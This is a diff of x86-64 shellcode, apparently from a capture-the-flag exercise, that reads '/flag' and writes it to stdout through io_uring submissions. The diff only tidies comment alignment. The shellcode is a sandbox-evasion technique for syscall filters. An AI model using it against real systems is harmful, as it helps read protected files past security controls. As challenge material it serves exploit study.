@@ -30,10 +30,10 @@ mov r15, r13                /* r15 = address of buf (r13 + 0x100, scratch space)
 add r15, 0x100              /* Go past sqes[0..3] */
 
 /* ZERO RING BUFFERS (4096 + 4096 = 8192 bytes total) */
-mov rdi, r12                                                                                                                                                                                                                                 /* Start at rings_stack (r12) */
+mov rdi, r12                /* Start at rings_stack (r12) */
 mov rcx, 0x2000             /* Length = 8192 bytes */
 xor rax, rax
-rep stosb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /* Clear rings_stack and sqes_stack */
+rep stosb                   /* Clear rings_stack and sqes_stack */
 
 /* Reset r15 to point to the scratch buffer after clearing */
 mov r15, r13
@@ -41,7 +41,7 @@ add r15, 0x100
 
 /* Setup path "/flag" into the stack buffer at r15 */
 mov rax, 0x00550067616c662f
-mov qword ptr [r15], rax                                                                                                                                                                
+mov qword ptr [r15], rax
 mov r14, r15                /* r14 = address of "/flag" for OPENAT */
 
 /* 2. Setup io_uring_params p on the stack (below rings_stack) */
@@ -90,17 +90,17 @@ inc dword ptr [r8]
 /* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit OPENAT */
 mov rax, 426                /* __NR_io_uring_enter */
 mov rdi, rbx                /* ring_fd */
-mov rsi, 1                                                                                                                                                                
-mov rdx, 1                                                                                                                                                                
-mov r10, 1                                                                                                                                                                
-mov r8, 0                                                                                                                                                                
-mov r9, 0                                                                                                                                                                
+mov rsi, 1
+mov rdx, 1
+mov r10, 1
+mov r8, 0 
+mov r9, 0 
 syscall
 
 /* Get fd from cqe[0].res */
 mov rdx, r12
-add rdx, 0x40                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* rdx = CQE array base */
-mov esi, dword ptr [rdx + 0x8] /* esi = fd = cqe[0].res (offset 0x8) */
+add rdx, 0x40                   /* rdx = CQE array base */
+mov esi, dword ptr [rdx + 0x8]  /* esi = fd = cqe[0].res (offset 0x8) */
 
 /* Update cq_head after OPENAT retrieval */
 mov r8, r12
@@ -108,8 +108,8 @@ add r8, 0x8
 inc dword ptr [r8]
 
 /* READ - Prepare sqe 1 */
-mov rdi, r13          
-add rdi, 0x40                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* rdi = address of sqes[1] */
+mov rdi, r13
+add rdi, 0x40                   /* rdi = address of sqes[1] */
 
 mov byte ptr [rdi], 22          /* sqe.opcode = 22 (IORING_OP_READ) */
 mov dword ptr [rdi+4], esi      /* sqe.fd = esi (opened file descriptor) */
@@ -132,21 +132,21 @@ mov r9, 0
 syscall
 
 /* Get bytes read (r) from cqe[1].res */
-mov r8, r12          
-add r8, 0x40                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* r8 = CQE array base */
-add r8, 0x10                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* r8 points to start of cqe[1] */
-mov r10d, dword ptr [r8 + 0x8]      /* r10d = bytes read (cqes[1].res) */                                                                                                                                       
+mov r8, r12
+add r8, 0x40                        /* r8 = CQE array base */
+add r8, 0x10                        /* r8 points to start of cqe[1] */
+mov r10d, dword ptr [r8 + 0x8]      /* r10d = bytes read (cqes[1].res) */
 
 /* Update cq_head after successful retrieval */
 mov r9, r12
-add r9, 0x8                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* r9 = cq_head address */
+add r9, 0x8                         /* r9 = cq_head address */
 inc dword ptr [r9]
 
 /* WRITE - Prepare sqe 2 */
 mov rdi, r13
-add rdi, 0x80                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* rdi = address of sqes[2] */
+add rdi, 0x80                       /* rdi = address of sqes[2] */
 
-mov byte ptr [rdi], 23          /* sqe.opcode = 23 (IORING_OP_WRITE) */
+mov byte ptr [rdi], 23              /* sqe.opcode = 23 (IORING_OP_WRITE) */
 mov dword ptr [rdi+4], 1        /* sqe.fd = 1 (stdout) */
 mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
 mov dword ptr [rdi+0x18], r10d  /* sqe.len = r10d (bytes read) */
